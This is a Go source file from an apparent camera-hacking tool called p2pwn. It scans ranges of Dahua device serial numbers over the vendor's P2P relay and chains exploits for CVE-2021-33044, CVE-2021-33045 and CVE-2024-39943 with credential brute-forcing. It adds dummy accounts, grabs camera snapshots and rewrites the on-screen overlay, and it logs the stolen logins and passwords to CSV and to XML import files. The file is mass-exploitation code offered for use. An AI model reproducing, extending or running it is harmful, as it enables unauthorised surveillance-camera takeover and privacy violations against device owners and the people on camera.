package core

import (
	"fmt"
	"math"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/thebadinteger/p2pwn/core/p2p"
)

var (
	scanRed   = color.New(color.FgHiRed)
	scanGreen = color.New(color.FgGreen)
)

type Scanner struct {
	Targets     []string
	Config      *Config
	Threads     int
	OutDir      string
	InputSource string

	// Stats
	TotalCount     int64
	CompletedCount int64
	PwnedCount     int64
	OnlineCount    int64
	SafeCount      int64
	WasteCount     int64

	// Progress
	startTime     time.Time
	lastSample    time.Time
	lastCompleted int64
	lastRate      int64

	// Sync
	mu         sync.Mutex
	wg         sync.WaitGroup
	snapshotWg sync.WaitGroup
	cancelOnce sync.Once
	pwnedList  []ExploitResult
	cancelChan chan struct{}
}

func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string) *Scanner {
	return &Scanner{
		Targets:     targets,
		Config:      config,
		Threads:     threads,
		OutDir:      outDir,
		InputSource: inputSource,
		cancelChan:  make(chan struct{}),
	}
}

// connectTimeout returns the connection timeout from config.toml (ms)
func (s *Scanner) connectTimeout() time.Duration {
	timeoutMs := 5000
	if val, err := getIntValue(s.Config.Scan.Timeout); err == nil && val > 0 {
		timeoutMs = val
	}
	return time.Duration(timeoutMs) * time.Millisecond
}

func (s *Scanner) Run() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		s.cancelOnce.Do(func() { close(s.cancelChan) })

		nowStr := time.Now().Format("15:04:05")
		fmt.Printf("\r\n")
		scanRed.Printf("[%s] Interrupted\n", nowStr)

		os.Exit(0)
	}()

	ranges, err := ParseGenerateRanges(s.Config.Scan.Generate)
	if err != nil {
		ranges = []Range{{0, 1048576}}
	}

	retries := 3
	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}

	connTimeout := s.connectTimeout()

	nurses := 20
	if val, err := getIntValue(s.Config.Scan.Nurses); err == nil {
		nurses = val
	}

	var total int64 = 0
	for _, target := range s.Targets {
		if len(target) == 10 {
			for _, r := range ranges {
				total += int64(r.End - r.Start)
			}
		} else if len(target) == 15 {
			total++
		}
	}
	s.TotalCount = total

	nowStr := time.Now().Format("15:04:05")
	scanRed.Printf("[%s] p2pwn\n", nowStr)
	fmt.Printf("[input] > %s\n", s.InputSource)
	fmt.Printf("[count] > %d\n", s.TotalCount)
	fmt.Printf("[output] > %s\n", s.OutDir)
	fmt.Printf("[threads] > %d\n", s.Threads)
	fmt.Printf("[config] > %s\n\n", s.Config.Path)

	LogScanStart(s.InputSource, s.TotalCount, s.Threads, s.Config.Path, s.OutDir)
	os.MkdirAll(s.OutDir, 0755)
	s.writePwnedStart()

	onlineChan := make(chan string, s.Threads*2)
	handshakeChan := make(chan string, nurses*2)

	s.startTime = time.Now()
	s.lastSample = s.startTime

	go func() {
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-s.cancelChan:
				return
			case <-ticker.C:
				s.printProgress()
			}
		}
	}()

	for i := 0; i < s.Threads; i++ {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			for serial := range onlineChan {
				select {
				case <-s.cancelChan:
					return
				default:
				}
				s.handleOnlineSerial(serial, retries, connTimeout)
			}
		}()
	}

	var nurseWg sync.WaitGroup
	for i := 0; i < nurses; i++ {
		nurseWg.Add(1)
		go func() {
			defer nurseWg.Done()
			for serial := range handshakeChan {
				select {
				case <-s.cancelChan:
					return
				default:
				}
				online := p2p.CheckOnlineWith(serial, connTimeout, retries)
				if !online {
					s.mu.Lock()
					s.WasteCount++
					s.CompletedCount++
					s.mu.Unlock()
					continue
				}
				LogOnlineFound(serial)
				select {
				case onlineChan <- serial:
				case <-s.cancelChan:
					return
				}
			}
		}()
	}

	for _, target := range s.Targets {
		if len(target) == 15 {
			select {
			case <-s.cancelChan:
				goto cleanup
			default:
			}
			handshakeChan <- target
		} else if len(target) == 10 {
			for _, r := range ranges {
				for i := r.Start; i < r.End; i++ {
					select {
					case <-s.cancelChan:
						goto cleanup
					default:
					}
					suffix := fmt.Sprintf("%05X", i)
					handshakeChan <- target + suffix
				}
			}
		}
	}

cleanup:
	close(handshakeChan)
	nurseWg.Wait()
	close(onlineChan)
	s.wg.Wait()
	s.snapshotWg.Wait()
	s.cancelOnce.Do(func() { close(s.cancelChan) })
	s.printProgress()
	fmt.Println()

	LogScanFinish(s.CompletedCount, s.PwnedCount, s.OnlineCount, s.WasteCount, s.TotalCount)
	doneTimeStr := time.Now().Format("15:04:05")
	scanGreen.Printf("[%s] Done\n", doneTimeStr)
}

func tryType0Tunnel(serial string, retries int, timeout time.Duration) *p2p.DHClient {
	client := p2p.NewDHClient(serial)
	client.SetRetries(retries)
	if timeout > 0 {
		client.SetTimeout(timeout)
	}
	if err := client.Handshake(); err != nil {
		client.Close()
		return nil
	}
	if err := client.EstablishDirectP2P(); err != nil {
		if err = client.CompleteRelayHandshake(); err != nil {
			client.Close()
			return nil
		}
	}
	return client
}

func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout time.Duration) {
	var ok bool
	var finalClient *p2p.DHClient
	var requiresType1 bool

	var lastErr error
	for attempt := 0; attempt < retries; attempt++ {
		select {
		case <-s.cancelChan:
			return
		default:
		}
		client := p2p.NewDHClient(serial)
		client.SetRetries(retries)
		client.SetTimeout(connTimeout)
		err := client.Handshake()
		lastErr = err
		if err == nil {
			// type0 success. skip type1
			finalClient = client
			ok = true
			break
		}
		client.Close()
		if p2p.IsChannelAuthRequired(err) {
			requiresType1 = true
			LogType1ChannelAuthRequired(serial)
			break // break to type1
		}
	}

	// all attempts failed, assume type1
	if !ok && !requiresType1 && lastErr != nil {
		if strings.Contains(lastErr.Error(), "timeout") || strings.Contains(lastErr.Error(), "no response") {
			requiresType1 = true
			LogType1TimeoutAssume(serial, lastErr)
		}
	}

	if !ok && requiresType1 {
		LogType1Start(serial)
		if probe := tryType0Tunnel(serial, retries, connTimeout); probe != nil {
			finalClient = probe
			ok = true
			LogType1TunnelSuccess(serial)
		} else {
			if !s.Config.Pwn.Protocol["type1"] {
				LogType1Skipped(serial)
				s.mu.Lock()
				s.OnlineCount++
				s.CompletedCount++
				s.mu.Unlock()
				return
			}

			if s.Config.Pwn.Methods["brute"] && len(s.Config.Brute.Credentials) > 0 {
				type1Delay := 0
				if val, err := getIntValue(s.Config.Brute.Type1.Delay); err == nil && val > 0 {
					type1Delay = val
				}
				for idx, cred := range s.Config.Brute.Credentials {
					if type1Delay > 0 && idx > 0 {
						select {
						case <-s.cancelChan:
							return
						case <-time.After(time.Duration(type1Delay) * time.Second):
						}
					}
					select {
					case <-s.cancelChan:
						return
					default:
					}
					authClient := p2p.NewDHClient(serial)
					authClient.SetRetries(retries)
					authClient.SetTimeout(connTimeout)
					authClient.SetDeviceAuth(cred.Login, cred.Password, "")
					authErr := authClient.Handshake()
					if authErr == nil {
						finalClient = authClient
						ok = true
						LogType1Brute(serial, cred.Login, cred.Password, idx+1, nil)
						break
					}
					LogType1Brute(serial, cred.Login, cred.Password, idx+1, authErr)
					authClient.Close()
				}
			}
		}
	}

	if ok && finalClient != nil {
		LogHandshakeResult(serial, 0, 0, nil)
		s.mu.Lock()
		s.OnlineCount++
		s.mu.Unlock()
		s.processOnlineClient(serial, finalClient)
	} else {
		LogHandshakeResult(serial, 0, 0, lastErr)
		s.mu.Lock()
		s.WasteCount++
		s.CompletedCount++
		s.mu.Unlock()
	}
}

func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
	retries := 3
	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}

	for attempt := 0; attempt < retries; attempt++ {
		directOK := true
		err := client.EstablishDirectP2P()
		if err != nil {
			directOK = false
			err = client.CompleteRelayHandshake()
		}
		LogTunnelEstablishResult(serial, attempt, directOK, err)
		if err != nil {
			continue
		}

		stopHB := make(chan struct{})
		client.StartHeartbeat(stopHB)

		var tunnel *p2p.PTCPTunnel
		if directOK {
			tunnel = client.NewDirectTunnel()
		} else {
			tunnel = client.NewTunnel()
		}

		cleanup := func() {
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
		}

		pwned := s.processExploit(serial, client, tunnel, directOK, cleanup)
		if !pwned {
			go cleanup()
		}
		return
	}

	client.Close()
	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.mu.Unlock()
}

func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunnel *p2p.PTCPTunnel, reopen func(*ExploitResult) (*p2p.PTCPTunnel, bool), cleanup func()) {
	activeTunnel, fresh := reopen(res)
	res.IP = ip
	s.handlePwned(serial, res)

	osdCleanup := cleanup
	if fresh {
		osdCleanup = func() {
			if activeTunnel != nil {
				activeTunnel.Disconnect()
			}
			cleanup()
		}
	}

	if s.Config.Pwn.Snapshot && res != nil && res.Channels > 0 && res.Login != "" && res.Password != "" {
		captured := false
		for attempt := 0; attempt < 2; attempt++ {
			if CaptureSnapshot(activeTunnel, res.Method, res.Login, res.Password, res.Channels, s.OutDir, serial, res.Model) {
				captured = true
				break
			}
		}
		if !captured {
			if !s.launchSnapshot(serial, res) {
				s.mu.Lock()
				s.CompletedCount++
				s.mu.Unlock()
			}
			s.launchOSD(serial, activeTunnel, res, osdCleanup)
			return
		}
	}

	s.mu.Lock()
	s.CompletedCount++
	s.mu.Unlock()

	s.launchOSD(serial, activeTunnel, res, osdCleanup)
}

// report whether the method pwned the device
func stagePwned(stage string, res *ExploitResult, err error) bool {
	if err != nil || res == nil {
		return false
	}
	if stage == "cve-2021-33044" || stage == "cve-2021-33045" {
		return res.Password != ""
	}
	return true
}

func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2p.PTCPTunnel, directOK bool, cleanup func()) bool {
	reopenTunnelFor := func(res *ExploitResult) (*p2p.PTCPTunnel, bool) {
		if res == nil || (res.Method != "cve-2021-33044" && res.Method != "cve-2021-33045") || res.Login == "" || res.Password == "" {
			return tunnel, false
		}
		tunnel.Disconnect()

		var fresh *p2p.PTCPTunnel
		if directOK {
			fresh = client.NewDirectTunnel()
		} else {
			fresh = client.NewTunnel()
		}
		fresh.SetAuth(res.Login, res.Password)
		if model, channels, _, err := fresh.GetDeviceInfo(); err == nil && model != "" {
			res.Model = model
			res.Channels = channels
			return fresh, true
		}
		sdk := p2p.NewSDKClient(fresh, res.Login, res.Password)
		if _, model, channels, err := sdk.GetDeviceInfo(); err == nil {
			if model != "" {
				res.Model = model
			}
			if channels > 0 {
				res.Channels = channels
			}
		}
		return fresh, true
	}

	ip := ""
	remoteAddr := client.GetDeviceAddr()
	if remoteAddr != "" {
		if idx := strings.Index(remoteAddr, ":"); idx > 0 {
			ip = remoteAddr[:idx]
		} else {
			ip = remoteAddr
		}
	}

	LogExploitStart(serial, ip)

	// device was already authenticated, collect info and save
	if client.IsPwnedAuth() {
		user, pass, _, _ := client.GetDeviceAuth()
		tunnel.SetAuth(user, pass)

		model, channels, _, err := tunnel.GetDeviceInfo()
		if err != nil || model == "" {
			sdk := p2p.NewSDKClient(tunnel, user, pass)
			if _, m, ch, sErr := sdk.GetDeviceInfo(); sErr == nil {
				if m != "" {
					model = m
				}
				if ch > 0 {
					channels = ch
				}
			}
		}
		if model == "" {
			model = "Dahua Device"
		}
		if channels == 0 {
			channels = 1
		}
		res := &ExploitResult{
			Method:   "type1",
			Login:    user,
			Password: pass,
			Model:    model,
			Channels: channels,
			IP:       ip,
		}
		s.handlePwned(serial, res)
		if !s.launchSnapshot(serial, res) {
			s.mu.Lock()
			s.CompletedCount++
			s.mu.Unlock()
		}
		s.launchOSD(serial, tunnel, res, cleanup)
		return true
	}

	// CVE exploits
	finishStage := func(stage string, res *ExploitResult, err error) bool {
		if stagePwned(stage, res, err) {
			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
			return false
		}
		if err != nil {
			LogExploitStageFailed(serial, stage, err)
		}
		return true
	}

	// 1. CGI Exploits
	if s.Config.Pwn.Protocol["cgi"] {
		if s.Config.Pwn.Methods["cve-2021-33044"] {
			res, err := TryCVE2021_33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
			if !finishStage("cve-2021-33044", res, err) {
				return true
			}
		}

		if s.Config.Pwn.Methods["cve-2021-33045"] {
			res, err := TryCVE2021_33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
			if !finishStage("cve-2021-33045", res, err) {
				return true
			}
		}

		if s.Config.Pwn.Methods["cve-2024-39943"] {
			res, err := TryCVE2024_39943(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
			if !finishStage("cve-2024-39943", res, err) {
				return true
			}
		}

		if s.Config.Pwn.Methods["cve-2021-33045"] {
			if addRes, addErr := TryAddDummy33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password); !finishStage("cve-2021-33045-add", addRes, addErr) {
				return true
			}
		}

		if s.Config.Pwn.Methods["brute"] {
			res, err := TryBruteForceWeb(tunnel, s.Config.Brute.Credentials, serial)
			if err == nil && res != nil {
				s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
				return true
			} else if err != nil {
				LogExploitStageFailed(serial, "web-brute", err)
			}
		}
	} else if s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"] {
		// 2. SDK Brute (only executed if CGI protocol is disabled)
		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials, serial)
		if err == nil && res != nil {
			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
			return true
		} else if err != nil {
			LogExploitStageFailed(serial, "sdk-brute", err)
		}
	}

	LogExploitUnpwned(serial)

	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.mu.Unlock()
	return false
}

func (s *Scanner) dialFreshTunnel(serial string, res *ExploitResult) (*p2p.PTCPTunnel, func(), bool) {
	retries := 3
	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}
	connTimeout := s.connectTimeout()
	login, pass := res.Login, res.Password
	isType1 := res.Method == "type1"
	for attempt := 0; attempt < retries; attempt++ {
		client := p2p.NewDHClient(serial)
		client.SetRetries(retries)
		client.SetTimeout(connTimeout)
		if isType1 {
			client.SetDeviceAuth(login, pass, "")
		}
		if err := client.Handshake(); err != nil {
			client.Close()
			if !isType1 && p2p.IsChannelAuthRequired(err) && login != "" && pass != "" {
				client = p2p.NewDHClient(serial)
				client.SetRetries(retries)
				client.SetTimeout(connTimeout)
				client.SetDeviceAuth(login, pass, "")
				if err := client.Handshake(); err != nil {
					client.Close()
					continue
				}
			} else {
				continue
			}
		}
		directOK := true
		if err := client.EstablishDirectP2P(); err != nil {
			directOK = false
			if err = client.CompleteRelayHandshake(); err != nil {
				client.Close()
				continue
			}
		}
		stopHB := make(chan struct{})
		client.StartHeartbeat(stopHB)
		var tunnel *p2p.PTCPTunnel
		if directOK {
			tunnel = client.NewDirectTunnel()
		} else {
			tunnel = client.NewTunnel()
		}
		cleanup := func() {
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
		}
		return tunnel, cleanup, true
	}
	return nil, nil, false
}

func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
	if !s.Config.Pwn.Snapshot || res == nil || res.Channels <= 0 || res.Login == "" || res.Password == "" {
		return false
	}

	method := res.Method
	login := res.Login
	password := res.Password
	channels := res.Channels
	model := res.Model

	s.snapshotWg.Add(1)
	go func() {
		defer s.snapshotWg.Done()
		defer func() {
			s.mu.Lock()
			s.CompletedCount++
			s.mu.Unlock()
		}()

		retries := 3
		if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
			retries = val
		}
		connTimeout := s.connectTimeout()

		time.Sleep(500 * time.Millisecond)

		for attempt := 0; attempt < retries; attempt++ {
			client := p2p.NewDHClient(serial)
			client.SetRetries(retries)
			client.SetTimeout(connTimeout)

			isType1 := (method == "type1")
			if isType1 {
				client.SetDeviceAuth(login, password, "")
			}

			if err := client.Handshake(); err != nil {
				client.Close()
				if !isType1 && p2p.IsChannelAuthRequired(err) && login != "" && password != "" {
					client = p2p.NewDHClient(serial)
					client.SetRetries(retries)
					client.SetTimeout(connTimeout)
					client.SetDeviceAuth(login, password, "")

					if err := client.Handshake(); err != nil {
						client.Close()
						continue
					}
				} else {
					continue
				}
			}
			directOK := true
			if err := client.EstablishDirectP2P(); err != nil {
				directOK = false
				if err = client.CompleteRelayHandshake(); err != nil {
					client.Close()
					continue
				}
			}

			stopHB := make(chan struct{})
			client.StartHeartbeat(stopHB)

			var tunnel *p2p.PTCPTunnel
			if directOK {
				tunnel = client.NewDirectTunnel()
			} else {
				tunnel = client.NewTunnel()
			}

			snapshotOK := false
			for snapshotAttempt := 0; snapshotAttempt < retries; snapshotAttempt++ {
				if CaptureSnapshot(tunnel, method, login, password, channels, s.OutDir, serial, model) {
					snapshotOK = true
					break
				}
			}
			if snapshotOK {
				go func(tunnel *p2p.PTCPTunnel, stopHB chan struct{}, client *p2p.DHClient) {
					tunnel.Disconnect()
					close(stopHB)
					client.Close()
				}(tunnel, stopHB, client)
				return
			}
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
			continue
		}
	}()
	return true
}

func (s *Scanner) launchOSD(serial string, tunnel *p2p.PTCPTunnel, res *ExploitResult, cleanup func()) {
	if !s.Config.Overlay.Osd || res == nil || res.Login == "" || res.Password == "" {
		if cleanup != nil {
			cleanup()
		}
		return
	}
	channel := normalizeOSDChannel(s.Config.Overlay.Channel)
	lines := normalizeOSDLines(s.Config.Overlay.Custom)
	if channel == "" && len(lines) == 0 {
		if cleanup != nil {
			cleanup()
		}
		return
	}

	s.snapshotWg.Add(1)
	go func() {
		defer s.snapshotWg.Done()
		if cleanup != nil {
			defer cleanup()
		}
		redial := func() (*p2p.PTCPTunnel, func(), bool) {
			return s.dialFreshTunnel(serial, res)
		}
		err := TryOSD(tunnel, res.Login, res.Password, channel, lines, redial)
		if err != nil {
			LogOSDResult(serial, 5000, false, err)
			return
		}
		LogOSDResult(serial, 5000, true, nil)
	}()
}

func (s *Scanner) handlePwned(serial string, res *ExploitResult) {
	LogExploitPwned(serial, res.Method, res.Login, res.Password)
	s.mu.Lock()
	s.PwnedCount++
	s.pwnedList = append(s.pwnedList, *res)

	// Append to pwned.csv
	pwnedFile := filepath.Join(s.OutDir, "pwned.csv")
	f, err := os.OpenFile(pwnedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		line := fmt.Sprintf("%s,%s,%s,%s,%d,%s,%s\n",
			csvField(serial), csvField(res.Model), csvField(res.Login), csvField(res.Password),
			res.Channels, csvField(res.IP), csvField(res.Method))
		f.WriteString(line)
		f.Close()
	}

	// Save to import_*.xml
	s.writeXMLFiles(serial, res)
	s.mu.Unlock()
}

func csvField(s string) string {
	if strings.ContainsAny(s, "\",\n\r") {
		return "\"" + strings.ReplaceAll(s, "\"", "\"\"") + "\""
	}
	return s
}

func (s *Scanner) writeXMLFiles(serial string, res *ExploitResult) {
	pwnedIdx := len(s.pwnedList) - 1
	chunkSize := 64
	chunkIdx := pwnedIdx / chunkSize
	xmlFilename := fmt.Sprintf("import_%d.xml", chunkIdx+1)
	xmlPath := filepath.Join(s.OutDir, xmlFilename)

	encPass := FastEnc(res.Password)
	row := BuildDeviceXMLRow(serial, res.Login, encPass)

	if _, err := os.Stat(xmlPath); os.IsNotExist(err) {
		var sb strings.Builder
		sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
		sb.WriteString("<DeviceManager version=\"2.0\">\n")
		sb.WriteString(row)
		sb.WriteString("</DeviceManager>\n")
		os.WriteFile(xmlPath, []byte(sb.String()), 0644)
	} else {
		data, err := os.ReadFile(xmlPath)
		if err != nil {
			// Corrupted or unreadable
			var sb strings.Builder
			sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
			sb.WriteString("<DeviceManager version=\"2.0\">\n")
			sb.WriteString(row)
			sb.WriteString("</DeviceManager>\n")
			os.WriteFile(xmlPath, []byte(sb.String()), 0644)
			return
		}
		content := strings.TrimSuffix(string(data), "</DeviceManager>\n")
		content += row + "</DeviceManager>\n"
		os.WriteFile(xmlPath, []byte(content), 0644)
	}
}

func (s *Scanner) writePwnedStart() {
	pwnedFile := filepath.Join(s.OutDir, "pwned.csv")
	needHeader := false
	if st, err := os.Stat(pwnedFile); os.IsNotExist(err) || st.Size() == 0 {
		needHeader = true
	}
	f, err := os.OpenFile(pwnedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		if needHeader {
			f.WriteString("sn,model,login,password,channels,ip,vuln\n")
		}
		f.Close()
	}
}

func (s *Scanner) printProgress() {
	s.mu.Lock()
	defer s.mu.Unlock()

	var pct float64 = 0.0
	if s.TotalCount > 0 {
		pct = (float64(s.CompletedCount) / float64(s.TotalCount)) * 100.0
	}

	var pctStr string
	if s.CompletedCount >= s.TotalCount {
		pctStr = "100%"
	} else {
		pct = math.Floor(pct*10) / 10
		pctStr = fmt.Sprintf("%.1f%%", pct)
	}

	now := time.Now()
	if !s.startTime.IsZero() {
		if dt := now.Sub(s.lastSample); dt >= 500*time.Millisecond {
			s.lastRate = int64(float64(s.CompletedCount-s.lastCompleted) / dt.Seconds())
			s.lastSample = now
			s.lastCompleted = s.CompletedCount
		}
	}

	line := fmt.Sprintf("[%s] pwned > %d | online > %d | waste > %d | %d/s [%s]",
		pctStr, s.PwnedCount, s.OnlineCount, s.WasteCount, s.lastRate, formatElapsed(now.Sub(s.startTime)))
	fmt.Printf("\033[2K\r%s", line)
}

func formatElapsed(d time.Duration) string {
	if d < 0 {
		d = 0
	}
	total := int64(d.Seconds())
	return fmt.Sprintf("%02d:%02d:%02d", total/3600, (total%3600)/60, total%60)
}
